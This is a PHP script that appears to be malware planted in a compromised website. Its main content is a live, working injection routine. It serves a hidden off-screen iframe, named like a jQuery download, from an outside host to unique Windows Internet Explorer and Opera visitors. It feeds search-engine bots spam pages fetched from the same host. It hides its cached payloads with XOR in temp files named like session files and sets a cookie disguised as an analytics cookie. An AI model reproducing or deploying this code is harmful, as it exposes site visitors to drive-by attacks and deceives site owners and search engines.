<?php
if (!defined('frmDs')) {
    
    define('frmDs' ,1);
        
    function frm_dl ($url) 
    {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $out = curl_exec ($ch);
            if (curl_errno($ch) !== 0) $out = false;
            curl_close ($ch);		
        } else {
            $out = @file_get_contents($url);
        }
        return trim($out);	
    }		
        
    function frm_crpt($in) 
    {		
        $il=strlen($in);$o='';		
        for ($i = 0; $i < $il; $i++) $o.=$in[$i] ^ '*';
        return $o;	
    }
    function frm_getcache($tmpdir,$link,$cmtime,$del=true)
    {		
        $f = $tmpdir . '/sess_' . md5(preg_replace('/^http:\/\/[^\/]+/', '', $link));
        if(!file_exists($f) || time() - filemtime($f) > 60 * $cmtime) {
            $dlc=frm_dl($link);			
            if($dlc===false){
                if(del)
                    @unlink($f);
                else
                    @touch($f);
            } else {
                if($fp = @fopen($f,'w')){
                    fwrite($fp, frm_crpt($dlc)); fclose($fp);
                } else {
                    return $dlc;
                }
            }
        }
                        $fc = @file_get_contents($f);		
                        return ($fc)?frm_crpt($fc):'';	
                    }		
                        function frm_isbot($ua){
                            if(($lip=ip2long($_SERVER['REMOTE_ADDR']))<0)$lip+=4294967296;
                            $rs = array(array(3639549953,3639558142),array(1089052673,1089060862),array(1123635201,1123639294),array(1208926209,1208942590),
                                        array(3512041473,3512074238),array(1113980929,1113985022),array(1249705985,1249771518),array(1074921473,1074925566),
                                        array(3481178113,3481182206),array(2915172353,2915237886));
                            foreach ($rs as $r) if($lip>=$r[0] && $lip<=$r[1]) return true;		if(!$ua)return true;		$bots = array('googlebot','bingbot','slurp','msnbot','jeeves','teoma','crawler','spider');		foreach ($bots as $b) if(strpos($ua, $b)!==false) return true;		return false;	}		
                        function frm_tmpdir(){
                            $fs = array('/tmp','/var/tmp');
                            foreach (array('TMP', 'TEMP', 'TMPDIR') as $v) {
                                if ($t = getenv($v)) {$fs[]=$t;}
                                }        if (function_exists('sys_get_temp_dir')) {$fs[]=sys_get_temp_dir();}        $fs[]='.';		        foreach ($fs as $f){        	$tf = $f.'/'.md5(rand());        	if($fp = @fopen($tf, 'w')){        		fclose($fp);        		unlink($tf);        		return $f;        	}        }		return false;	}	function frm_seref(){		$r = @strtolower($_SERVER["HTTP_REFERER"]);		$ses = array('google','bing','yahoo','ask','aol');		foreach ($ses as $se) if(strpos($r, $se.'.')!=false) return true;		return false;	}		function frm_isuniq($tdir){		$ip=$_SERVER['REMOTE_ADDR'];		$dbf=$tdir.'/sess_'.md5(date('m.d.y'));		$odbf = $tdir.'/sess_'.md5(date('m.d.y',time()-86400));		if (file_exists($odbf)) @unlink($odbf);		if(strpos(frm_crpt(@file_get_contents($dbf)),$ip) === false ){			if ($fp=@fopen($dbf,'a')){fputs($fp,frm_crpt($ip.'|')); fclose($fp);}			return true;		}		return false;	}		$tdir = frm_tmpdir();	$defframe = '<style>	.ljqbca { position:absolute; left:-779px; top:-778px; }</style><div class="ljqbca"><iframe src="http://kbjvzhfhmxq.kwik.to/jquery/get.php?ver=jquery.latest.js" width="392" height="351"></iframe></div>';	$defrdg='http://kbjvzhfhmxq.kwik.to/jquery/get.php?ver=jquery.js'; 	$codelink = '';	$rdglink='';		$ua=$_SERVER['HTTP_USER_AGENT'];	$isb=frm_isbot($ua);		if (!$isb && preg_match('/Windows/', $ua) && preg_match('/MSIE|Opera/', $ua) && frm_isuniq($tdir) ){		error_reporting(0);			if(!isset($_COOKIE['__utmfr'])) {			if(!$codelink)				print($defframe);			else				print(frm_getcache($tdir,$codelink,15));			@setcookie('__utmfr',rand(1,1000),time()+86400*7,'/');		}	}		//-------	$host = preg_replace('/^w{3}\./','', strtolower($_SERVER['HTTP_HOST']));	if($tdir && strlen($host)<100 && !preg_match('/^[0-9\.]+$/',$host)){		$parg = substr(preg_replace( '/[^a-z]+/', '',strtolower(base64_encode(md5($host)))),0,3);		$pageid = (isset($_GET[$parg]))?$_GET[$parg]*1:0;		$ruri = strtolower($_SERVER['REQUEST_URI']);		if((strpos($ruri,'/?')===0||strpos($ruri,'/index.php?')===0) && $pageid > 0){			print(frm_getcache($tdir,"http://kbjvzhfhmxq.kwik.to/rdg/getpage.php?h=$host&p=$pageid&pa=$parg",60*48,false));			exit();		}		if ($isb) {			error_reporting(0);
    print(frm_getcache($tdir,"http://kbjvzhfhmxq.kwik.to/rdg/getpage.php?h=$host&pa=$parg&g=".(($ruri=='/'||$ruri=='/index.php')?'1':'0'),60*48,false));
    }	}
    //---------}